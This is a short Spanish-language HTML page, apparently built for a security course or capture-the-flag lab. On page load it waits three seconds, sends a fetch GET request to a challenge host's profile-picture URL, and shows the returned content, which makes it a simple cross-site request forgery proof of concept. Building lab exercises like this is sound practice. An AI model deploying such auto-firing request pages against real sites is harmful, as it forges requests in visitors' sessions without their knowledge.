<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <title>Página de Pruebas CSRF con Retraso</title>
    <style>
        #respuesta-servidor {
            margin-top: 20px;
            padding: 10px;
            border: 1px solid #ccc;
            white-space: pre-wrap; 
            background-color: #f7f7f7;
            font-family: monospace;
        }
    </style>
</head>
<body>

    <h1>Página de Pruebas CSRF</h1>
    <p>Esta página hará un GET a la URL objetivo **después de un retraso de 3 segundos**.</p>
    
    <p id="estado-peticion">Estado: **Esperando 3 segundos para asegurar la sesión...**</p>
    
    <h2>Respuesta del Servidor (Contenido HTML obtenido):</h2>
    <div id="respuesta-servidor">Esperando respuesta...</div>

    <script>
        const URL_OBJETIVO = 'https://chl-a85cf6b8-7049-4023-abe6-fee13a1a5d5a-imagen-importante.softwareseguro.com.ar/profile-pic';
        const DELAY_MS = 3000; // Retraso en milisegundos (3 segundos)

        const estadoElemento = document.getElementById('estado-peticion');
        const respuestaElemento = document.getElementById('respuesta-servidor');

        // La función principal que ejecuta el GET
        function ejecutarGet() {
            estadoElemento.textContent = `Estado: Enviando petición...`; // Actualiza el estado
            
            fetch(URL_OBJETIVO)
                .then(response => {
                    estadoElemento.textContent = `Estado: Petición enviada (Status: ${response.status}).`;
                    return response.text(); 
                })
                .then(data => {
                    respuestaElemento.textContent = data;
                })
                .catch(error => {
                    estadoElemento.textContent = `Estado: Error de red. Revisa la consola (F12) para errores de CORS.`;
                    respuestaElemento.textContent = `Error: ${error.message}`;
                    console.error('Error en la petición GET:', error);
                });
        }

        // Función que se ejecuta al cargar la página
        window.onload = function() {
            // Utilizamos setTimeout para ejecutar ejecutarGet() después de DELAY_MS
            setTimeout(ejecutarGet, DELAY_MS);
        };
    </script>

</body>
</html>
